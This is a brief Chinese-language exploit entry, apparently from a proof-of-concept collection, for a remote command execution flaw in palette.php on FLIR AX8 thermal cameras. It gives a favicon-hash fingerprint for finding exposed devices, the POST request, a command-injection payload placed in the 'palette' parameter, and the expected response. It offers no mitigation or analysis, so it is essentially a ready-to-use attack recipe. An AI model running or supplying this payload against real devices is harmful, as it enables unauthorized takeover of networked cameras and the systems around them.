# FLIR-AX8热成像仪palette.php存在远程命令执行漏洞

FLIR ｜ 命令执行 ｜ —
- **指纹**：`web.icon=="f4370ff0b4763e18159cd7cdf36a4542"`
- **请求**：`POST /palette.php HTTP/1.1`

**Payload**
```
palette=;id>66.txt;
```
- **响应特征**：200